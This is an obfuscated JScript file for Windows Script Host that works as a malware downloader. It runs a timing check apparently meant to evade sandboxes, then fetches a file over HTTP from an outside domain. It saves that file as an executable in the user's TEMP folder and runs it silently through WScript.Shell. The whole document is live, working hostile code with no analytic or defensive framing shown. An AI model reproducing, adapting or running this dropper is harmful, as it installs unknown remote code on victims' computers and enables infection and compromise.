var HF = false;
var zZ = "CreateObject";
var l = function ze() {return WScript[zZ]("WScript.Shell");}(), QX = 11;
var m = "MSXML2.XMLHTTP";
var sk = 2123213;
var hq = 0;
function bT(q){l["Run"](q, hq, hq);};
function y(){return "" + m;};
function M(LW, D){hq = hq * 1; return LW - D;};
function SX(){return zZ;};
/*@cc_on
  @if (@_win32 || @_win64)
    HF = true;
  @end
@*/
if (HF)
{
var B = "";
function X(){return 22;};
var fZ = 0; var HH = 0;
function z()
{
var X0 = new this["Date"]();
var T = X0["getUTCMilliseconds"]();
WScript["Sleep"](X());
var X0 = new this["Date"]();
var FC = X0["getUTCMilliseconds"]();
WScript["Sleep"](X());
var X0 = new this["Date"]();
var iQ = X0["getUTCMilliseconds"]();
var fZ = "tM";
fZ = M(FC, T);
var HH = "jW";
HH = M(iQ, FC);
B = "open";
return M(fZ, HH);
}
var K = false;
var li = false;
for (var G = hq; G < X() * 1; G++){if (z() != hq){
K = true; 
HH = "31" + 11 * fZ + HH; 
li = true; 
break;
}}
function c() {return ((K == true) && (K == li)) ? 1 : hq;};
if (K && c() && li){
function Lk() {return l["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "NxklInaJTIS15.exe";};
 qz = y();
 G0 = WScript[zZ](qz);
 var a = 1;
 while (a){
try {
G0[B]("GET", "http://caferacerpneus.com.br/lw2osd", false);
G0["send"]();
rl = "Sleep";
for (;;){WScript[rl](X() * 11); if (G0["readystate"] >= 2 * 2) break;};
a = hq;
} catch(v){};
}
function w(Ha) {var YJ = (1, 2, 3, 4, 5, Ha); return YJ;};
J = WScript[SX()]("ADODB.Stream");
qz = J;
qz[B]();
qz["type"] = w(1);
qz["write"](G0["ResponseBody"]);
J["position"] = w(hq);
qz["Save" + "ToFile"](Lk(), 2);
J["c"+"lose"]();
w0 = Lk();
bT(w0);
}
}

